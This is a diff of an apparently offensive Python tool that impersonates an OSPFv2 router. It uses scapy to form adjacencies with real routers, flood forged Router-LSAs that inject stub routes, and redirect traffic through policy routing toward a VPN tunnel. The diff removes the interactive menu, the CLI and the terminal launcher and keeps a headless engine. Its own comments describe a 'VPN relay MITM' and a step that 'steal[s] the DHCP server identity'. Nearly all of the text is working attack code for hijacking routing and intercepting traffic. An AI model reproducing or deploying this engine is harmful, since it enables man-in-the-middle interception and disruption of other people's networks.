@@ -26,18 +26,13 @@ Self-contained module.  Used two ways:
                                               injected stubs from neighbours' RIBs
 """
 from __future__ import annotations
-import argparse
 import ipaddress
-import os
 import platform
-import shlex
-import shutil
 import socket
 import subprocess
 import sys
 import threading
 import time
-from pathlib import Path
 
 try:
     from scapy.all import Ether, IP, conf as scapy_conf, get_if_addr, sendp, sniff
@@ -63,18 +58,13 @@ ALL_DR_MAC = "01:00:5e:00:00:06"
 OSPF_PROTO = getattr(socket, "IPPROTO_OSPF", 89)
 OSPF_OPTIONS = 0x02
 DEAD_INTERVAL = 40
-HELLO_INTERVAL = 10
 INITIAL_DBD_SEQ = 1000
+OSPF_INTERFACE_MTU = 1500
+OSPF_LINK_METRIC_DEFAULT = 1
 BASE_LSA_SEQUENCE = 0x80000001
 BACKBONE_AREA = "0.0.0.0"
 DEFAULT_ROUTER_ID = "99.99.99.99"
 OSPF_SNIFF_FILTER = "ip proto 89 or (vlan and ip proto 89)"
-OSPF_NBR_ROUTES_DB = {}
-AUTO_ROUTE_IP_ENV = "OSPF_AUTO_ROUTE_IP"
-
-OSPF_AREA_ID_ENV = "OSPF_AREA_ID"
-OSPF_DEAD_INTERVAL_ENV = "OSPF_DEAD_INTERVAL"
-OSPF_EXTRA_SUBNETS_ENV = "OSPF_EXTRA_SUBNETS"  # comma-separated CIDRs to inject as stubs
 
 DOWN = "DOWN"
 INIT = "INIT"
@@ -86,14 +76,6 @@ FULL = "FULL"
 
 ACTIVE_NEIGHBOR_STATES = (INIT, TWO_WAY, EXSTART, EXCHANGE, LOADING, FULL)
 DBD_READY_STATES = (EXSTART, EXCHANGE, LOADING, FULL)
-MENU_HELP_TEXT = (
-    "[MENU] Available commands: '1' adds a Router-LSA route, '2' shows neighbours, "
-    "'3' shows the LSDB, '4' shows OSPF_NBR_ROUTES_DB, '5' enumerates OSPF subnets "
-    "(VLAN SVIs), 'q' hides the menu prompt, 'm' shows it again."
-)
-MENU_PROMPT = "ospf-menu> "
-MENU_HIDDEN_PROMPT = "ospf-menu(hidden)> "
-MENU_HIDDEN_TEXT = "[MENU] The menu prompt is hidden. Type 'm' to show it again."
 
 
 def log_message(message):
@@ -346,8 +328,8 @@ def setup_policy_routing(iface, svi_ip, tun_iface=None, vpn_subnets=None):
                 net = str(_ip.IPv4Interface(token).network)
                 r(["ip", "route", "add", net, "dev", iface,
                    "table", _POLICY_TABLE], capture_output=True, check=False)
-            except Exception:
-                pass
+            except Exception as exc:
+                log_message(f"[WARN] Could not add subnet route to table {_POLICY_TABLE}: {exc}")
             break
     if tun_iface and vpn_subnets:
         for subnet in vpn_subnets:
@@ -448,7 +430,7 @@ def withdraw_injected_routes(context):
         flood_lsa_packets(context, [maxage_lsa])
         log_message("[TEARDOWN] Flooded MaxAge Router-LSA — injected routes will be purged.")
     except Exception as exc:
-        log_message(f"[TEARDOWN] Could not flood MaxAge LSA: {exc}")
+        log_message(f"[TEARDOWN] WARNING: Could not flood MaxAge LSA: {exc} — injected routes will persist until natural LSA expiry (~30 min)")
 
 
 # ── Router-LSA route injection (inlined from former ospf_route_addition.py) ────
@@ -495,81 +477,13 @@ def prompt_and_add_router_stub_route(context, input_func):
         return
 
 
-def default_iface():
-    try:
-        interface_name = getattr(scapy_conf.iface, "name", str(scapy_conf.iface))
-        if interface_name and interface_name != "None":
-            return interface_name
-    except Exception:
-        pass
-    return "Ethernet" if platform.system() == "Windows" else "eth0"
-
-
-def linux_interface_exists(interface_name):
-    if platform.system().lower() != "linux" or not shutil.which("ip"):
-        return False
-    result = subprocess.run(
-        ["ip", "link", "show", "dev", interface_name],
-        capture_output=True,
-        text=True,
-        check=False,
-    )
-    return result.returncode == 0
-
-
-def ensure_vlan_subinterface(interface_name, vlan_id):
-    """Create/use a Linux VLAN subinterface for OSPF when --vlan is supplied."""
-    if vlan_id is None:
-        return interface_name
-
-    vlan_id = int(vlan_id)
-    if not 1 <= vlan_id <= 4094:
-        sys.exit(f"[!] Invalid VLAN ID: {vlan_id}")
-    if platform.system().lower() != "linux":
-        sys.exit("[!] --vlan requires Linux/Kali VLAN subinterface support.")
-    if not shutil.which("ip"):
-        sys.exit("[!] --vlan requires the Linux 'ip' command.")
-
-    if interface_name.endswith(f".{vlan_id}"):
-        subinterface = interface_name
-        parent_interface = interface_name.rsplit(".", 1)[0]
-    else:
-        parent_interface = interface_name
-        subinterface = f"{interface_name}.{vlan_id}"
-
-    if not linux_interface_exists(subinterface):
-        result = subprocess.run(
-            ["ip", "link", "add", "link", parent_interface, "name", subinterface, "type", "vlan", "id", str(vlan_id)],
-            capture_output=True,
-            text=True,
-            check=False,
-        )
-        if result.returncode != 0:
-            sys.exit(f"[!] Could not create VLAN subinterface {subinterface}: {result.stderr.strip()}")
-        log_message(f"[VLAN] Created {subinterface} on {parent_interface} for VLAN {vlan_id}.")
-    else:
-        log_message(f"[VLAN] Using existing VLAN subinterface {subinterface}.")
-
-    for target_interface in (parent_interface, subinterface):
-        result = subprocess.run(
-            ["ip", "link", "set", target_interface, "up"],
-            capture_output=True,
-            text=True,
-            check=False,
-        )
-        if result.returncode != 0:
-            sys.exit(f"[!] Could not bring {target_interface} up: {result.stderr.strip()}")
-
-    return subinterface
-
-
 def read_interface_ip(interface_name):
     try:
         address = get_if_addr(interface_name)
         if address and address != "0.0.0.0":
             return address
-    except Exception:
-        pass
+    except Exception as exc:
+        log_message(f"[WARN] get_if_addr({interface_name}): {exc}")
     if platform.system() == "Windows":
         try:
             if interface_name.startswith("\\Device\\"):
@@ -683,7 +597,6 @@ def make_context(interface_name, source_ip, network_mask, hello_interval,
         "manual_router_links": [],
         "adjacency_ready_event": threading.Event(),
         "stop_event": threading.Event(),
-        "menu_suppressed": False,
         "source_ip_available": True,
         "ospf_raw_socket": None,
         "ospf_raw_socket_warning_logged": False,
@@ -807,7 +720,7 @@ def build_hello(context):
 
 def build_dbd(context, _neighbor_entry, is_initial_packet=False, has_more_packets=False, is_master_packet=True, sequence_number=0, lsa_headers=None):
     database_description_flags = (0x04 if is_initial_packet else 0) | (0x02 if has_more_packets else 0) | (0x01 if is_master_packet else 0)
-    database_description_packet = build_header(context, 2) / OSPF_DBDesc(mtu=1500, options=OSPF_OPTIONS, dbdescr=database_description_flags, ddseq=sequence_number)
+    database_description_packet = build_header(context, 2) / OSPF_DBDesc(mtu=OSPF_INTERFACE_MTU, options=OSPF_OPTIONS, dbdescr=database_description_flags, ddseq=sequence_number)
     for lsa_header in (lsa_headers or []):
         database_description_packet = database_description_packet / lsa_header
     return database_description_packet
@@ -816,10 +729,10 @@ def build_dbd(context, _neighbor_entry, is_initial_packet=False, has_more_packet
 def build_router_lsa(context, sequence_number=BASE_LSA_SEQUENCE):
     with context["lock"]:
         if context["designated_router"] != "0.0.0.0":
-            attached_link = OSPF_Link(type=2, id=context["designated_router"], data=context["source_ip"], metric=1)
+            attached_link = OSPF_Link(type=2, id=context["designated_router"], data=context["source_ip"], metric=OSPF_LINK_METRIC_DEFAULT)
         else:
             network_prefix, network_mask = normalize_network(context["source_ip"], context["network_mask"])
-            attached_link = OSPF_Link(type=3, id=network_prefix, data=network_mask, metric=1)
+            attached_link = OSPF_Link(type=3, id=network_prefix, data=network_mask, metric=OSPF_LINK_METRIC_DEFAULT)
         link_list = [attached_link]
         link_list.extend(link.copy() for link in context["manual_router_links"])
     return OSPF_Router_LSA(
@@ -835,79 +748,6 @@ def build_router_lsa(context, sequence_number=BASE_LSA_SEQUENCE):
 
 def get_lsa_key(lsa_packet):
     return (lsa_packet.type, lsa_packet.id, lsa_packet.adrouter)
-
-
-def enumerate_ospf_subnets(context):
-    """Return all subnets advertised in the LSDB, derived from Router-LSA stub links.
-
-    Each Type-1 Router-LSA contains stub links (link type=3) which represent
-    directly connected networks — i.e. SVI subnets.  Collecting these gives the
-    full set of VLAN subnets visible in the OSPF domain without any trunking or
-    PVST+ sniffing.  Only LSAs from FULL neighbours are included.
-    """
-    with context["lock"]:
-        lsdb = list(context["local_lsdb"])
-        full_nbr_ids = {
-            nbr["router_id"]
-            for nbr in context["neighbors"].values()
-            if nbr["state"] == FULL
-        }
-    subnets = []
-    seen = set()
-    for lsa in lsdb:
-        if getattr(lsa, "type", None) != 1:
-            continue
-        adv = str(getattr(lsa, "adrouter", ""))
-        if adv not in full_nbr_ids and adv != context["router_id"]:
-            continue
-        for link in getattr(lsa, "linklist", []):
-            if int(getattr(link, "type", 0)) != 3:
-                continue
-            net, mask = normalize_network(
-                str(getattr(link, "id", "0.0.0.0")),
-                str(getattr(link, "data", "0.0.0.0")),
-            )
-            key = (net, mask)
-            if key in seen:
-                continue
-            seen.add(key)
-            subnets.append({"network": net, "netmask": mask, "adv_router": adv})
-    return subnets
-
-
-def rebuild_ospf_nbr_routes_db(context):
-    global OSPF_NBR_ROUTES_DB
-    route_map = {}
-    full_neighbor_ids = {
-        neighbor["router_id"]
-        for neighbor in context["neighbors"].values()
-        if neighbor["state"] == FULL
-    }
-    for lsa_packet in context["local_lsdb"]:
-        if getattr(lsa_packet, "type", None) != 1:
-            continue
-        advertising_router = str(getattr(lsa_packet, "adrouter", "0.0.0.0"))
-        if advertising_router not in full_neighbor_ids:
-            continue
-        routes = []
-        for link in getattr(lsa_packet, "linklist", []):
-            if int(getattr(link, "type", 0)) != 3:
-                continue
-            network, netmask = normalize_network(
-                str(getattr(link, "id", "0.0.0.0")),
-                str(getattr(link, "data", "0.0.0.0")),
-            )
-            routes.append({
-                "network": network,
-                "netmask": netmask,
-                "metric": int(getattr(link, "metric", 0)),
-                "lsa_id": str(getattr(lsa_packet, "id", "0.0.0.0")),
-                "advertising_router": advertising_router,
-                "sequence": f"0x{getattr(lsa_packet, 'seq', 0):08x}",
-            })
-        if routes:
-            route_map[advertising_router] = routes
-    OSPF_NBR_ROUTES_DB = route_map
 
 
 def format_neighbor_status(neighbor):
@@ -935,11 +775,9 @@ def upsert_lsa(context, lsa_packet):
             continue
         if getattr(lsa_packet, "seq", 0) >= getattr(existing_lsa, "seq", 0):
             context["local_lsdb"][index] = lsa_packet.copy()
-            rebuild_ospf_nbr_routes_db(context)
             return True
         return False
     context["local_lsdb"].append(lsa_packet.copy())
-    rebuild_ospf_nbr_routes_db(context)
     return True
 
 
@@ -1033,7 +871,7 @@ def maybe_add_auto_route(context):
                     context, str(net.network_address), str(net.netmask), 1,
                 )
             except Exception as exc:
-                log_message(f"[WARN] Could not inject extra subnet {cidr}: {exc}")
+                log_message(f"[WARN] Could not inject extra subnet {cidr}: {exc} — VPN relay MITM may be incomplete")
         with context["lock"]:
             context["extra_subnets_added"] = True
 
@@ -1044,8 +882,6 @@ def reset_adjacency_state(context, reason):
         context["designated_router"] = "0.0.0.0"
         context["backup_designated_router"] = "0.0.0.0"
         context["adjacency_ready_event"].clear()
-        context["menu_suppressed"] = False
-        rebuild_ospf_nbr_routes_db(context)
     log_message(f"[RESET] {reason}")
 
 
@@ -1157,12 +993,9 @@ def update_full_adjacency_gate(context):
 
 # Adjacency forms in protocol order before any manual route advertisement is allowed.
 def transition_neighbor(context, neighbor, new_state):
-    previous_state = neighbor["state"]
     neighbor["state"] = new_state
-    if previous_state == FULL and new_state != FULL:
-        rebuild_ospf_nbr_routes_db(context)
     if new_state == FULL:
-        state_full(context, neighbor)
+        state_full(neighbor)
 
 
 def state_down(context, neighbor):
@@ -1267,8 +1100,7 @@ def state_loading(context, neighbor, packet):
     return self_lsa
 
 
-def state_full(context, neighbor):
-    rebuild_ospf_nbr_routes_db(context)
+def state_full(neighbor):
     log_message(format_neighbor_status(neighbor))
 
 
@@ -1424,138 +1256,6 @@ def dispatch_packet(context, packet):
         handle_lsupd(context, packet)
 
 
-def runtime_console(context):
-    log_message("[MENU] Waiting for FULL adjacency before enabling manual actions.")
-    while not context["stop_event"].is_set():
-        if not context["adjacency_ready_event"].wait(timeout=1):
-            continue
-        with context["lock"]:
-            suppress_menu = context["menu_suppressed"]
-        try:
-            command = input(MENU_HIDDEN_PROMPT if suppress_menu else MENU_PROMPT).strip().lower()
-        except EOFError:
-            continue
-        except KeyboardInterrupt:
-            context["stop_event"].set()
-            return
-        if suppress_menu:
-            if command == "" or command == "q":
-                continue
-            if command == "m":
-                with context["lock"]:
-                    context["menu_suppressed"] = False
-                log_message("[MENU] The menu prompt is enabled again. Type 'help' to view the available commands.")
-                continue
-            log_message(MENU_HIDDEN_TEXT)
-            continue
-        if command == "":
-            continue
-        if command == "help":
-            log_message(MENU_HELP_TEXT)
-            continue
-        if command == "m":
-            log_message("[MENU] The menu prompt is already enabled. Type 'help' to view the available commands.")
-            continue
-        if command == "1":
-            if not context["adjacency_ready_event"].is_set():
-                log_message("[MENU] Wait until all discovered neighbors reach FULL before flooding a manual Router-LSA.")
-                continue
-            prompt_and_add_router_stub_route(context, input)
-            continue
-        if command == "2":
-            show_neighbors(context)
-            continue
-        if command == "3":
-            lsa_packets = local_lsdb_entries(context)
-            if not lsa_packets:
-                log_message("[LSDB] Local LSDB is empty.")
-                continue
-            for lsa_packet in lsa_packets:
-                log_message(
-                    f"[LSDB] type={lsa_packet.type} id={lsa_packet.id} adv={lsa_packet.adrouter} "
-                    f"seq=0x{getattr(lsa_packet, 'seq', 0):08x}"
-                )
-            continue
-        if command == "4":
-            route_map = {
-                advertising_router: [route.copy() for route in routes]
-                for advertising_router, routes in OSPF_NBR_ROUTES_DB.items()
-            }
-            if not route_map:
-                log_message("[ROUTES] OSPF_NBR_ROUTES_DB is empty.")
-                continue
-            for advertising_router in sorted(route_map):
-                for route in route_map[advertising_router]:
-                    log_message(
-                        f"[ROUTES] adv={advertising_router} net={route['network']} "
-                        f"mask={route['netmask']} metric={route['metric']} seq={route['sequence']}"
-                    )
-            continue
-        if command == "5":
-            subnets = enumerate_ospf_subnets(context)
-            if not subnets:
-                log_message("[SUBNETS] No subnets found in LSDB yet (wait for FULL adjacency).")
-            else:
-                log_message(f"[SUBNETS] {len(subnets)} subnet(s) advertised in this OSPF domain:")
-                for s in subnets:
-                    log_message(f"[SUBNETS]   {s['network']}/{s['netmask']}  adv={s['adv_router']}")
-            continue
-        if command == "q":
-            with context["lock"]:
-                context["menu_suppressed"] = True
-            log_message(MENU_HIDDEN_TEXT)
-            continue
-        log_message(f"[MENU] Unknown command '{command}'. Type 'help' to view the available commands.")
-
-
-def run_engine(context):
-    ensure_ospf_raw_socket(context)
-    threading.Thread(
-        target=sniff,
-        kwargs=dict(iface=context["interface_name"], filter=OSPF_SNIFF_FILTER, prn=lambda packet: dispatch_packet(context, packet), store=0),
-        daemon=True,
-    ).start()
-    threading.Thread(target=runtime_console, args=(context,), daemon=True).start()
-    log_message(f"[*] Sniffer on {context['interface_name']}")
-    log_message("[*] Hellos sending -- Ctrl+C to stop.\n")
-
-    try:
-        while True:
-            if not refresh_runtime_source_ip(context):
-                update_full_adjacency_gate(context)
-                time.sleep(context["hello_interval"])
-                continue
-            send_packet(context, build_hello(context))
-
-            with context["lock"]:
-                expired = [
-                    (router_id, neighbor)
-                    for router_id, neighbor in context["neighbors"].items()
-                    if time.time() - neighbor["last_seen"] > context["dead_interval"]
-                ]
-                lost_full_neighbor = context["adjacency_ready_event"].is_set() and any(
-                    neighbor["state"] == FULL and is_dr_or_bdr_neighbor(neighbor)
-                    for _, neighbor in expired
-                )
-                for router_id, _neighbor in expired:
-                    del context["neighbors"][router_id]
-                if expired:
-                    rebuild_ospf_nbr_routes_db(context)
-            if lost_full_neighbor:
-                log_message("[MENU] FULL adjacency is no longer stable. Manual Router-LSA flooding is paused.")
-            for router_id, _neighbor in expired:
-                log_message(f"[DEAD] {router_id} expired.")
-
-            update_full_adjacency_gate(context)
-            maybe_add_auto_route(context)
-            time.sleep(context["hello_interval"])
-    except KeyboardInterrupt:
-        context["stop_event"].set()
-        withdraw_injected_routes(context)
-        close_ospf_raw_socket(context)
-        log_message("\n[*] Exiting.")
-
-
 # ── Headless engine (embedded in main.py) ────────────────────────────────────
 
 def run_engine_headless(context):
@@ -1600,8 +1300,6 @@ def run_engine_headless(context):
             )
             for router_id, _neighbor in expired:
                 del context["neighbors"][router_id]
-            if expired:
-                rebuild_ospf_nbr_routes_db(context)
         if lost_full_neighbor:
             log_message("[OSPF] FULL adjacency lost — route injection paused.")
         for router_id, _neighbor in expired:
@@ -1615,20 +1313,8 @@ def run_engine_headless(context):
 
 
 def add_route_interactive(context):
-    """Prompt for network/mask/metric and inject a stub into the Router-LSA.
-
-    Convenience wrapper so external callers (e.g. main.py debug menu) do not
-    need to pass all internal function references.
-    """
-    prompt_and_add_router_stub_route(
-        context, input, log_message,
-        normalize_network=normalize_network,
-        ospf_link_cls=OSPF_Link,
-        next_lsa_sequence=next_lsa_sequence,
-        build_router_lsa=build_router_lsa,
-        upsert_lsa=upsert_lsa,
-        flood_lsa_packets=flood_lsa_packets,
-    )
+    """Prompt for network/mask/metric and inject a stub into the Router-LSA."""
+    prompt_and_add_router_stub_route(context, input)
 
 
 # ── Integration helpers (called by main.py) ──────────────────────────────────
@@ -1636,167 +1322,5 @@ def add_route_interactive(context):
 OSPF_FULL_WAIT_TIMEOUT = 300
 
 
-def wait_for_adjacency_exchange(interface, source_ip, timeout=OSPF_FULL_WAIT_TIMEOUT):
-    """Block until an OSPF LS Request/Update (type 4/5) is seen from a neighbor.
-
-    Confirms the engine launched in the other terminal has reached the database
-    exchange phase before main.py proceeds to steal the DHCP server identity.
-    """
-    seen = []
-
-    def handle_packet(packet):
-        if packet.haslayer(OSPF_Hdr) and packet.haslayer(IP) and packet[IP].src != source_ip:
-            packet_type = int(packet[OSPF_Hdr].type)
-            if packet_type in {4, 5}:
-                seen.append(packet_type)
-                return True
-        return False
-
-    log_message(f"[*] Waiting up to {timeout}s for OSPF adjacency exchange on {interface}")
-    sniff(iface=interface, filter=OSPF_SNIFF_FILTER, store=False, timeout=timeout, stop_filter=handle_packet)
-    if seen:
-        log_message(f"[OK] Detected OSPF adjacency exchange (type {seen[-1]}) on {interface}")
-        return
-    log_message(f"[!] Timed out waiting for OSPF adjacency exchange on {interface}")
-    raise TimeoutError(f"Timed out waiting for OSPF adjacency exchange on {interface}")
 
 
-def launch_in_terminal(interface, vlan_id=None, auto_route_ip=None,
-                       area_id=None, hello_interval=None, dead_interval=None,
-                       extra_subnets=None):
-    """Run this OSPF engine in a new Linux terminal so its interactive menu works.
-
-    On non-Linux hosts, falls back to a blocking foreground run.
-    area_id, hello_interval, and dead_interval (learned from sniff_ospf_hellos)
-    are forwarded to the child process so it matches the SVI's parameters exactly.
-    """
-    ospf_script = Path(__file__).resolve()
-    ospf_command = [sys.executable, str(ospf_script), "--iface", interface]
-    child_env = os.environ.copy()
-    if vlan_id is not None:
-        ospf_command.extend(["--vlan", str(vlan_id)])
-    if hello_interval is not None:
-        ospf_command.extend(["--interval", str(int(hello_interval))])
-    if auto_route_ip is not None:
-        child_env[AUTO_ROUTE_IP_ENV] = str(ipaddress.IPv4Address(auto_route_ip))
-    else:
-        child_env.pop(AUTO_ROUTE_IP_ENV, None)
-    if area_id is not None:
-        child_env[OSPF_AREA_ID_ENV] = str(area_id)
-    else:
-        child_env.pop(OSPF_AREA_ID_ENV, None)
-    if dead_interval is not None:
-        child_env[OSPF_DEAD_INTERVAL_ENV] = str(int(dead_interval))
-    else:
-        child_env.pop(OSPF_DEAD_INTERVAL_ENV, None)
-    if extra_subnets:
-        child_env[OSPF_EXTRA_SUBNETS_ENV] = ",".join(str(s) for s in extra_subnets)
-    else:
-        child_env.pop(OSPF_EXTRA_SUBNETS_ENV, None)
-
-    if platform.system().lower() != "linux":
-        log_message(f"[*] Launching OSPF full adjacency engine on {interface}")
-        subprocess.run(ospf_command, check=True, env=child_env)
-        return
-
-    shell_command = " ".join(shlex.quote(str(part)) for part in ospf_command)
-    terminal_shell_command = (
-        f"{shell_command}; "
-        "exit_code=$?; "
-        "echo; "
-        "echo \"OSPF adjacency engine exited with status ${exit_code}.\"; "
-        "read -r -p \"Press Enter to close this terminal...\"; "
-        "exit ${exit_code}"
-    )
-    terminal_options = [
-        ("x-terminal-emulator", ["-e", "bash", "-lc", terminal_shell_command]),
-        ("qterminal", ["-e", "bash", "-lc", terminal_shell_command]),
-        ("xfce4-terminal", ["--hold", "--command", f"bash -lc {shlex.quote(terminal_shell_command)}"]),
-        ("gnome-terminal", ["--", "bash", "-lc", terminal_shell_command]),
-        ("konsole", ["--noclose", "-e", "bash", "-lc", terminal_shell_command]),
-        ("xterm", ["-hold", "-e", "bash", "-lc", terminal_shell_command]),
-    ]
-
-    for terminal_name, terminal_args in terminal_options:
-        terminal_path = shutil.which(terminal_name)
-        if terminal_path:
-            log_message(f"[*] Opening OSPF adjacency engine in a new terminal on {interface}")
-            subprocess.Popen([terminal_path, *terminal_args], env=child_env)
-            log_message(f"[OK] OSPF adjacency terminal launched with {terminal_name}")
-            return
-
-    raise RuntimeError(
-        "No supported Linux terminal emulator found. Install x-terminal-emulator, "
-        "qterminal, xfce4-terminal, gnome-terminal, konsole, or xterm."
-    )
-
-
-def main():
-    parser = argparse.ArgumentParser(prog="ospf_adjacency.py")
-    parser.add_argument("--iface", default=default_iface())
-    parser.add_argument("--vlan", type=int, help="Create/use iface.VLAN and run OSPF on that VLAN subinterface")
-    parser.add_argument("--interval", default=HELLO_INTERVAL, type=int)
-    args = parser.parse_args()
-
-    ospf_interface = ensure_vlan_subinterface(args.iface, args.vlan)
-
-    source_ip, network_mask = read_interface_state(ospf_interface)
-    if not source_ip or not network_mask:
-        sys.exit(f"[!] No usable IPv4 address or netmask for '{ospf_interface}'.")
-
-    auto_route_ip = os.environ.get(AUTO_ROUTE_IP_ENV)
-    if auto_route_ip:
-        try:
-            auto_route_ip = str(ipaddress.IPv4Address(auto_route_ip))
-        except ipaddress.AddressValueError:
-            log_message(f"[WARN] Ignoring invalid {AUTO_ROUTE_IP_ENV} value: {auto_route_ip}")
-            auto_route_ip = None
-
-    area_id = os.environ.get(OSPF_AREA_ID_ENV, BACKBONE_AREA)
-    try:
-        ipaddress.IPv4Address(area_id)
-    except ipaddress.AddressValueError:
-        log_message(f"[WARN] Ignoring invalid {OSPF_AREA_ID_ENV} value: {area_id!r}")
-        area_id = BACKBONE_AREA
-
-    dead_interval = DEAD_INTERVAL
-    raw_dead = os.environ.get(OSPF_DEAD_INTERVAL_ENV)
-    if raw_dead:
-        try:
-            dead_interval = int(raw_dead)
-        except ValueError:
-            log_message(f"[WARN] Ignoring invalid {OSPF_DEAD_INTERVAL_ENV} value: {raw_dead!r}")
-
-    extra_subnets = []
-    raw_extra = os.environ.get(OSPF_EXTRA_SUBNETS_ENV, "")
-    for raw_cidr in raw_extra.split(","):
-        raw_cidr = raw_cidr.strip()
-        if not raw_cidr:
-            continue
-        try:
-            ipaddress.IPv4Network(raw_cidr, strict=False)
-            extra_subnets.append(raw_cidr)
-        except ValueError:
-            log_message(f"[WARN] Ignoring invalid extra subnet {raw_cidr!r}")
-
-    log_message("=" * 52)
-    log_message("  OSPFv2 Full Adjacency Engine")
-    log_message(f"  iface={ospf_interface}  src={source_ip}  rid={DEFAULT_ROUTER_ID}")
-    log_message(f"  area={area_id}  hello={args.interval}s  dead={dead_interval}s")
-    if extra_subnets:
-        log_message(f"  extra stubs: {', '.join(extra_subnets)}")
-    log_message("=" * 52)
-
-    context = make_context(
-        ospf_interface, source_ip, network_mask, args.interval,
-        auto_route_ip=auto_route_ip,
-        area_id=area_id,
-        dead_interval=dead_interval,
-        extra_subnets=extra_subnets,
-    )
-    refresh_local_router_lsa(context)
-    run_engine(context)
-
-
-if __name__ == "__main__":
-    main()
